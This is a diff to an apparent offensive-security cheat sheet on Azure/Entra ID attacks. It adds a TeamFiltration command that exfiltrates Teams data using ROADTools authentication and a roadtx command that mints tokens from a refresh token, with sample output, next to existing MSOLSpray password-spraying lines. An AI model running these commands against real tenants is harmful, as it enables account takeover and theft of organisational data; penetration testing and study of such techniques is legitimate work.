@@ -7,6 +7,7 @@ tags: ["Cloud", "Azure", "Password Spraying", "Enumeration", "Microsoft", "Windo
 ### Recon
 
 {{< tab set1 tab1 >}}ROADTools{{< /tab >}}
+{{< tab set1 tab2 >}}TeamFiltration{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
 #### 1. Authenticate
@@ -51,6 +52,19 @@ WARNING: This is a development server. Do not use it in a production deployment.
 Press CTRL+C to quit
 ```
 
+<small>*Ref: [ROADTools](https://github.com/dirkjanm/ROADtools)*</small>
+
+{{< /tabcontent >}}
+{{< tabcontent set1 tab2 >}}
+
+#### 1. Data Exfiltration
+
+```console
+./TeamFiltration --roadtools .roadtools_auth --exfil --teams --outpath <OUTPUT_PATH>
+```
+
+<small>*Ref: [TeamFiltration](https://github.com/Flangvik/TeamFiltration)*</small>
+
 {{< /tabcontent >}}
 
 ---
@@ -84,5 +98,27 @@ Invoke-MSOLSpray -UserList <USERS_FILE> -Password
 ```
 
 <small>*Ref: [MSOLSpray](https://github.com/dafthack/MSOLSpray)*</small>
+
+{{< /tabcontent >}}
+
+---
+
+### Generate Token with Refresh Token
+
+{{< tab set3 tab1 >}}ROADTools{{< /tab >}}
+{{< tabcontent set3 tab1 >}}
+
+```console
+roadtx gettokens --refresh-token '<SECRET>' -c '<CLIENT_ID>'
+```
+
+```console {class="sample-code"}
+┌──(venv)─(kali㉿kali)-[~]
+└─$ roadtx gettokens --refresh-token '1.Aa8AA...[SNIP]...zt4WQ' -c '04b07...[SNIP]...f7b46'
+Requesting token for resource https://graph.windows.net
+Tokens were written to .roadtools_auth
+```
+
+<small>*Ref: [ROADTools](https://github.com/dirkjanm/ROADtools)*</small>
 
 {{< /tabcontent >}}
